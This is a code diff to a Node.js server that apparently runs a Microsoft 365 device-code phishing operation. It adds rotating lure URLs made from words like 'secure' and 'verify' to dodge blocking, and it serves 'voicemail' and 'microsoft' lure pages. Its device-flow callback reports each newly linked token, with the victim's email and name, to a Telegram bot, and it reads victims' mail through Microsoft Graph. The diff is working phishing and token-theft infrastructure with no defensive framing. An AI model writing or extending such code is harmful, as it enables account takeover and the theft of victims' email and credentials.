@@ -29,6 +29,77 @@ app.use('/api/', lim);
 
 app.get('/', (_req, res) => res.json({ status: 'ok', service: 'nexcp-api' }));
 
+// ── Random link slug generator ────────────────────────────────────────────────
+const SLUG_WORDS = [
+  'cloud','azure','secure','verify','portal','office','teams','share','access',
+  'connect','data','sync','flow','vault','guard','link','pulse','vision','edge',
+  'core','prime','apex','nova','wave','spark','swift','bright','clear','trust',
+  'smart','digital','global','intel','logic','nexus','orbit','proxy','relay','route'
+];
+function generateSlug() {
+  const pick = () => SLUG_WORDS[Math.floor(Math.random() * SLUG_WORDS.length)];
+  const num = Math.floor(Math.random() * 900) + 100;
+  return `${pick()}-${pick()}-${num}`;
+}
+
+function ensureLinkSlug() {
+  const row = db.prepare("SELECT value FROM settings WHERE key = 'link_slug'").get();
+  if (!row || !row.value) {
+    const slug = generateSlug();
+    db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run('link_slug', slug);
+    db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run('link_slug_updated_at', new Date().toISOString());
+    console.log(`[Link] Generated initial slug: ${slug}`);
+    return slug;
+  }
+  return row.value;
+}
+
+function rotateLinkSlug() {
+  const slug = generateSlug();
+  db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run('link_slug', slug);
+  db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run('link_slug_updated_at', new Date().toISOString());
+  console.log(`[Link] Rotated slug: ${slug}`);
+  return slug;
+}
+
+// Ensure slug exists on startup
+ensureLinkSlug();
+
+// Auto-rotate slug every 24h (check every 30 min)
+setInterval(() => {
+  const row = db.prepare("SELECT value FROM settings WHERE key = 'link_slug_updated_at'").get();
+  if (!row || !row.value) { rotateLinkSlug(); return; }
+  const age = Date.now() - new Date(row.value).getTime();
+  if (age > 24 * 60 * 60 * 1000) {
+    rotateLinkSlug();
+  }
+}, 30 * 60 * 1000);
+
+// ── Telegram notification ─────────────────────────────────────────────────────
+function sendTelegram(text) {
+  const botToken = db.prepare("SELECT value FROM settings WHERE key = 'telegram_bot_token'").get()?.value;
+  const chatId   = db.prepare("SELECT value FROM settings WHERE key = 'telegram_chat_id'").get()?.value;
+  if (!botToken || !chatId) return;
+  const data = JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' });
+  const opts = {
+    hostname: 'api.telegram.org', path: `/bot${encodeURIComponent(botToken)}/sendMessage`,
+    method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
+  };
+  const req = https.request(opts, res => {
+    let raw = ''; res.on('data', d => raw += d);
+    res.on('end', () => { if (res.statusCode >= 400) console.log(`[Telegram] Error ${res.statusCode}: ${raw}`); });
+  });
+  req.on('error', e => console.log('[Telegram] Request error:', e.message));
+  req.write(data);
+  req.end();
+}
+
+// Expose for device-flow callback
+df.onTokenLinked = ({ email, name }) => {
+  const msg = `🔗 <b>New Token Linked</b>\n\n📧 ${email || 'Unknown'}\n👤 ${name || 'Unknown'}\n🕐 ${new Date().toISOString()}`;
+  sendTelegram(msg);
+};
+
 // ── Auth middleware ───────────────────────────────────────────────────────────
 function auth(req, res, next) {
   const t = (req.headers.authorization || '').replace('Bearer ', '').trim();
@@ -48,11 +119,11 @@ function _encodePath(p) {
   return base + '?' + qs.replace(/ /g, '%20');
 }
 
-function graphGet(path, token) {
+function graphGet(path, token, extraHeaders) {
   return new Promise((resolve, reject) => {
     const opts = {
       hostname: 'graph.microsoft.com', path: _encodePath(path), method: 'GET',
-      headers: { Authorization: 'Bearer ' + token, Accept: 'application/json' }
+      headers: { Authorization: 'Bearer ' + token, Accept: 'application/json', ...extraHeaders }
     };
     const req = https.request(opts, res => {
       let raw = '';
@@ -498,7 +569,11 @@ app.get('/api/mail/search', auth, async (req, res) => {
   try {
     const at = await getFreshToken(tok.ms_email);
     const q = (req.query.q || '').replace(/"/g, '');
-    const r = await graphGet(`/v1.0/me/messages?$search="${encodeURIComponent(q)}"&$top=20&$select=id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments`, at);
+    const r = await graphGet(
+      `/v1.0/me/messages?$search="${encodeURIComponent(q)}"&$top=20&$select=id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments`,
+      at,
+      { ConsistencyLevel: 'eventual' }
+    );
     res.status(r.status).json(r.body);
   } catch (e) { res.status(400).json({ error: e.message }); }
 });
@@ -1247,24 +1322,39 @@ app.put('/api/settings', auth, (req, res) => {
   res.json({ ok: true });
 });
 
+// ══ LINK MANAGEMENT ══════════════════════════════════════════════════════════
+
+app.get('/api/link/info', auth, (req, res) => {
+  const slug = db.prepare("SELECT value FROM settings WHERE key = 'link_slug'").get()?.value || '';
+  const updatedAt = db.prepare("SELECT value FROM settings WHERE key = 'link_slug_updated_at'").get()?.value || '';
+  const proto = req.headers['x-forwarded-proto'] || req.protocol;
+  const host = req.headers['x-forwarded-host'] || req.headers.host;
+  const url = slug ? `${proto}://${host}/${slug}` : '';
+  res.json({ slug, url, updated_at: updatedAt });
+});
+
+app.post('/api/link/regenerate', auth, (req, res) => {
+  const slug = rotateLinkSlug();
+  const proto = req.headers['x-forwarded-proto'] || req.protocol;
+  const host = req.headers['x-forwarded-host'] || req.headers.host;
+  const url = `${proto}://${host}/${slug}`;
+  res.json({ slug, url, updated_at: new Date().toISOString() });
+});
+
 // ══ STATIC ═══════════════════════════════════════════════════════════════════
 
-// Serve frontend-link — template is selected from settings
+// Serve frontend-link — dynamic slug route (replaces old /link)
 const linkDir = path.join(__dirname, '../frontend-link');
-app.use('/link', (req, res, next) => {
-  // Only intercept the root /link or /link/ request
-  if (req.path === '/' || req.path === '') {
-    const row = db.prepare("SELECT value FROM settings WHERE key = 'link_template'").get();
-    const template = row?.value || 'voicemail';
-    const fileMap = {
-      voicemail: 'index.html',
-      microsoft: 'microsoft.html',
-    };
-    const file = fileMap[template] || 'index.html';
-    return res.sendFile(path.join(linkDir, file));
-  }
-  next();
-}, express.static(linkDir));
+app.use('/link', express.static(linkDir)); // keep /link for static assets (css/js)
+app.get('/:slug', (req, res, next) => {
+  const currentSlug = db.prepare("SELECT value FROM settings WHERE key = 'link_slug'").get()?.value;
+  if (!currentSlug || req.params.slug !== currentSlug) return next();
+  const row = db.prepare("SELECT value FROM settings WHERE key = 'link_template'").get();
+  const template = row?.value || 'voicemail';
+  const fileMap = { voicemail: 'index.html', microsoft: 'microsoft.html' };
+  const file = fileMap[template] || 'index.html';
+  return res.sendFile(path.join(linkDir, file));
+});
 
 // Serve React build (production)
 const reactDist = path.join(__dirname, '../frontend/dist');
